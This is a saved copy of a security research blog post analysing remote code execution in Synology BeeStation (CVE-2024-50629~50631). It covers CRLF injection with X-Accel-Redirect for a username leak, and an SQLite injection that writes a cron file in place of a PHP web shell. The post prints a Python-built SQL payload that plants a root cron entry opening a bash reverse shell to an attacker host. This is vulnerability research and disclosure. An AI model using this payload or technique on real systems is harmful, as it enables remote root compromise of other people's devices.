---
raindrop_id: 1489677153
raindrop_highlights:
  69400225066d3c4e6807db02: ab37c67f1fc30fc6a7b04b6ce562f3d5
  69400233dd9ad6079a1a97bd: 2faea81ea73927a7f91121dab0015bd9
  694289956d5b4dd8096140b1: 1a7faf40b65f144e1a77c4ce432aee68
  694289b09743b35ad7e20978: 989b0f667416ca960fe6f1c5346f4278
  694289ee94973a3333095304: 0ce2f19edbbb3ab1d221d95262eae76b
  69428a7a9743b35ad7e23ac4: d388d4e599ffa04fdc2659cbc2726ae2
  69428a80a46377ad98392106: 2af5dec30f39b5ecce57a97a7007f9f9
  69428a89a8c39696f663b5fc: bc34260870725730516e992b8f2bc27d
  69428a99ee5068ffc3fc1a0b: 9758569bdc566c07be0d7cd475f39962
  69428aae46a3fe3744c90c96: cfc52dddcca21da3a77efa5b5dfb814f
  69428acc94973a33330986fe: a98284ca699ff7492af397a9e436307e
  69428ad797b3ce8dd5fe86bb: ea2308b5835c567f87368c9eb98c5cc1
  69428ada24ce21262522d414: 084d40c3fcd7e7718c406f585806b9d6
  69428af124ce21262522d8d1: d7aa2ef4f5d4abf3d1e6b6811d29f064
  69428b0b6d5b4dd80961963a: 2a72e6f02ec2f2e02cfba7b4ab790bc6
title: "Writing Sync, Popping Cron: DEVCORE’s Synology BeeStation RCE & A Novel SQLite Injection RCE Technique (CVE-2024-50629~50631)"

description: |-
  Introduction

source: https://kiddo-pwn.github.io/blog/2025-11-30/writing-sync-popping-cron

created: 1765788419649
type: article
tags: ["_index"]

 
  - "tech-blog" 
  - "vuln-research-blog" 
  - "sql-injection" 
  - "sqlite"

---
# Writing Sync, Popping Cron: DEVCORE’s Synology BeeStation RCE & A Novel SQLite Injection RCE Technique (CVE-2024-50629~50631)

![](https://kiddo-pwn.github.io/blog/assets/images/2025-11-30-writing-sync-popping-cron/x_thezdi_tweet.png)

> [!summary]
> Introduction





I had identified a simple universal application of the SQLite “Dirty File Write” primitive. I verified SQLite Injection to target the crontab, establishing a reliable RCE vector specifically for PHP-free environments—a scenario lacking published universal technique.
In this post, I will share the technical details of my N-day analysis and introduce this SQLite Injection RCE technique, which serves as a universal alternative in the PHP web shell.
X-Accel-Redirect to Leak Username

To weaponize this CRLF Injection in nginx environment, the X-Accel-Redirect header was utilized. This header enables an attacker to force an internal redirection (SSRF-like behavior), granting access to protected locations defined in the nginx configuration.
As noted in prior research by Justin Taft, the /volume1/ directory is accessible via an internal alias, providing access to application data or system files:

File: /etc/nginx/nginx.conf

 server {

        listen 80;
        listen [::]:80;
        ...

        location ~ ^/volume(?:X|USB|SATA|Gluster)?\d+/ {
            internal;
            root /;
            open_file_cache off;
            include conf.d/x-accel.*.conf;
        }
Since the log records home directory paths upon initialization, it exposes the system username(i.e. kiddo.pwn). Leveraging the CRLF Injection to inject X-Accel-Redirect allowed for the retrieval of this log, yielding the valid username for the last stage:
This necessitates an alternative code execution path that functions without PHP.
Exploitation

The general exploitation technique for SQLite Injection involves using ATTACH DATABASE to write a PHP web shell. However, the BeeStation does not include a PHP interpreter:
Strategy: Think SQLite Injection as a Dirty File Write
ATTACH DATABASE allows an attacker to create arbitrary files on the system. This can be weaponized as a Dirty File Write primitive. However, the resulting file is a SQLite database, which inevitably contains binary headers and metadata (“Binary Pollution”).
There are constraints in terms of what files can be written:

Constraint 1: Cannot overwrite existing non-Database files. ATTACH fails if target file exists and isn’t a valid SQLite DB.
Constraint 2: Output contains binary SQLite metadata. This “pollution” can break parsers that expect clean text files.
This is why PHP web shells have been the go-to target for SQLite injection:

Constraint 1: Simply create a new .php file that doesn’t exist yet.
Constraint 2: The PHP interpreter is forgiving—it ignores the binary garbage until it encounters the <?php tag.
Without PHP, we need to consider another parser that could tolerate binary pollution. A promising candidate that met all the constraints: crontab.
Solution: Fault-Tolerant Cront
What makes crontab special? As documented in Disguise and Delimit by Ryan Emmons, the cron daemon exhibits a unique fault tolerance:

“Surprisingly… the cron daemon will simply ignore malformed lines and continue down the file to locate valid lines.”

This is exactly what we need. If we can inject a valid crontab entry surrounded by newlines (\n), the cron daemon will treat the SQLite binary headers as “malformed lines” and simply skip over them.
Since there was no input validation restricting newline characters, I constructed the following payload:

payload = '";'
payload += "ATTACH DATABASE '/etc/cron.d/pwn.task' AS cron;"
payload += "CREATE TABLE cron.tab (dataz text);"
payload += f"INSERT INTO cron.tab (dataz) VALUES ('\n* * * * * root bash -i >& /dev/tcp/{self.lhost}/{self.LPORT} 0>&1\n');"
payload += "--"


The payload is expected to work as follow:

Break out of the original query with ";
Attach a new SQLite database file at /etc/cron.d/pwn.task
Create a table to hold the text payload
Insert the crontab entry, wrapped with newlines to isolate it from SQLite metadata
Comment out the remainder of the original SQL query with --

Upon execution, the created file /etc/cron.d/pwn.task contains a mix of binary SQLite headers and injected text.